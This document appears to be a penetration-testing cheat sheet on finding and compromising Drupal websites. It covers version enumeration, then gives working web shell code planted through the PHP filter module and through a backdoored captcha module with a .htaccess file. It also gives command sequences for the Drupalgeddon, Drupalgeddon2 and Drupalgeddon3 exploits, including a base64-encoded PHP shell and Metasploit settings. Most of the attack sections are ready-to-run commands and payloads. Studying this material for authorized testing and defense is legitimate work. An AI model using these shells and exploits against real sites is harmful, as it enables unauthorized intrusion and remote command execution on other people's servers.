# Drupal

The use of a CMS on a web application is usually quite easy to spot with visual elements:

* Credits at the bottom or corner of pages
* HTTP headers
* Common files (e.g. `robots.txt`, `sitemap.xml`)
* Comments and metadata (HTML, CSS, JavaScript)
* Stack traces and verbose error messages

Drupal supports three types of users by default:

1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.

### Discovery / Footprinting

A Drupal website can be identified in several ways, including by the header or footer message Powered by Drupal, the standard Drupal logo, the presence of a `CHANGELOG.txt` file or `README.txt` file, via the page source, or clues in the `robots.txt` file such as references to `/node`

Another way to identify Drupal CMS is through nodes. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form `/node/<nodeid>`

```shellscript
curl -s <URL> | grep Drupal
```

#### Enumeration

```shellscript
# Enumerate the version => only works on older version => recent gives us a 404
curl -s <URL>/CHANGELOG.txt | grep -m2 ""

# Automate enum
droopescan scan drupal -u <URL>
```

### Attacking

#### PHP filter module

**Before version 8**

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which "Allows embedded PHP code/snippets to be evaluated"

Click on `Modules` ⇒ check the `PHP filter` box ⇒ `Permission` ⇒ check `Use PHP code`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FK2UbruJxteAd5xEfWmDi%2Fimage.png?alt=media&#x26;token=365c41d7-d63c-4f79-9a31-7a7275fed0a3" alt=""><figcaption></figcaption></figure>

Go to `Content` ⇒ `Add content` ⇒ `Basic page` and write a PHP shell

```php
<?php
system($_GET['cmd']);
?>
```

Change the text format to `PHP code` and save

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FNkVECKDVEmChMOM7DMq5%2Fimage.png?alt=media&#x26;token=15640c4a-dbdf-41bc-ba94-78aea5f81484" alt=""><figcaption></figcaption></figure>

We will be redirected to a new page ⇒ note the URL and add the injected shell parameter to interact with it

```shellscript
curl -s <URL>?<PARAMETER>=id | grep uid | cut -f4 -d">"
```

**After version 8**

From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first

```shellscript
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Once downloaded go to `Administration` => `Reports` => `Available updates`

Click browse and install

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FUyPmivJexpCXHI6MwzRO%2Fimage.png?alt=media&#x26;token=4141e837-1090-4284-8441-4c34ff72ce88" alt=""><figcaption></figcaption></figure>

Once the module is installed, we can click on Content and create a new basic page, similar to the steps above

#### Uploading a backdoored module

```shellscript
# Download a safe module 
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create a PHP web shell
<?php
system($_GET['cmd']);
?>

# Create a .htaccess file to give ourself access to the folder
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

# Put the files inside the module folder and compress it
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```

Click `Manage` ⇒ `Extend` ⇒ `Install New Module` ⇒ browse to the module and install

```shellscript
curl -s <URL>/modules/captcha/shell.php?cmd=id
```

#### Leveraging known vulnerabilities

**Drupalgeddon**

Affects versions `7.0` up to `7.31` and was fixed in version `7.32`. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user

```shellscript
# Install 
https://www.exploit-db.com/exploits/34992

# Use the exploit to create a new admin user
python2.7 drupalgeddon.py -t <URL> -u <NEW_USER> -p <PASS>

# We can now login as admin and obtain a shell like we did in the previous section

# Or use the metasploit one
use exploit/multi/http/drupal_drupageddon
```

**Drupalgeddon2**

Remote code execution vulnerability, which affects versions of Drupal prior to `7.58` and `8.5.1`. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected

```shellscript
# Install 
https://www.exploit-db.com/exploits/44448

# Exploit
python3 drupalgeddon2.py 

# Check created file 
curl -s <URL>/hello.txt

# Modify the exploit code to upload a php shell instead => replace the echo command
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee shell.php

# Run the exploit again and gain web shell 
curl <URL>/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

**Drupalgeddon3**

Authenticated remote code execution vulnerability that affects multiple versions of Drupal `7.x` and `8.x`. This flaw exploits improper validation in the Form API

It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie

```shellscript
# Metapsploit module 
https://github.com/rithchard/Drupalgeddon3

msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
```
